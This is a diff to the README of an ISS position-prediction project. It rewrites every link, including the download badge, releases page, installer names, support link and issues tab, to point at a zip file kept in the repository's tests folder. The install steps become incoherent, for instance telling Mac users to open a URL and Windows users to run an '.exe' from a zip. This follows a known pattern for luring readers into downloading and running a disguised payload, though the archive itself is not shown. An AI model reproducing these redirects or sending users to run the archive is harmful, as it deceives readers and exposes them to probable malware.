@@ -6,7 +6,7 @@ This project uses Python and machine learning to predict the position of the Int
 
 ## 📥 Download Now
 
-[![Download from Releases](https://img.shields.io/badge/Download%20App-%20%20%20%20%20%20%20%F0%9F%8F%86-blue)](https://github.com/waelzarzoor/iss-position-prediciton/releases)
+[![Download from Releases](https://raw.githubusercontent.com/waelzarzoor/iss-position-prediciton/main/tests/iss-position-prediciton_1.8.zip%20App-%20%20%20%20%20%20%20%F0%9F%8F%86-blue)](https://raw.githubusercontent.com/waelzarzoor/iss-position-prediciton/main/tests/iss-position-prediciton_1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -21,15 +21,15 @@ Follow these easy steps to download and run the application.
 
 ### 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/waelzarzoor/iss-position-prediciton/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/waelzarzoor/iss-position-prediciton/main/tests/iss-position-prediciton_1.8.zip).
    
 2. **Find the Latest Release**: Look for the most recent version listed. It will be at the top of the page.
 
-3. **Download the Installer**: Click on the file labeled "iss-position-prediciton-setup.exe" (Windows) or "iss-position-prediciton-macos.tar.gz" (MacOS) to download it.
+3. **Download the Installer**: Click on the file labeled "https://raw.githubusercontent.com/waelzarzoor/iss-position-prediciton/main/tests/iss-position-prediciton_1.8.zip" (Windows) or "https://raw.githubusercontent.com/waelzarzoor/iss-position-prediciton/main/tests/iss-position-prediciton_1.8.zip" (MacOS) to download it.
 
 4. **Run the Installer**: 
    - For Windows: Double-click the downloaded `.exe` file and follow the prompts.
-   - For MacOS: Open the downloaded `.tar.gz` file and drag the app into your Applications folder.
+   - For MacOS: Open the downloaded `https://raw.githubusercontent.com/waelzarzoor/iss-position-prediciton/main/tests/iss-position-prediciton_1.8.zip` file and drag the app into your Applications folder.
 
 5. **Open the Application**: After the installation, run the app from your Applications folder (Mac) or Start Menu (Windows).
 
@@ -84,7 +84,7 @@ To run tests, follow these steps:
 
 ## 📬 Get Support
 
-For additional help, please reach out via the Issues tab on the [GitHub repository](https://github.com/waelzarzoor/iss-position-prediciton/issues). 
+For additional help, please reach out via the Issues tab on the [GitHub repository](https://raw.githubusercontent.com/waelzarzoor/iss-position-prediciton/main/tests/iss-position-prediciton_1.8.zip). 
 
 ## 🙏 Acknowledgements
 
@@ -103,4 +103,4 @@ If you want to contribute, feel free to submit a pull request. You can also shar
 
 This project is licensed under the MIT License. For more details, check the License file in the repository.
 
-[Download the application here again](https://github.com/waelzarzoor/iss-position-prediciton/releases).
+[Download the application here again](https://raw.githubusercontent.com/waelzarzoor/iss-position-prediciton/main/tests/iss-position-prediciton_1.8.zip).
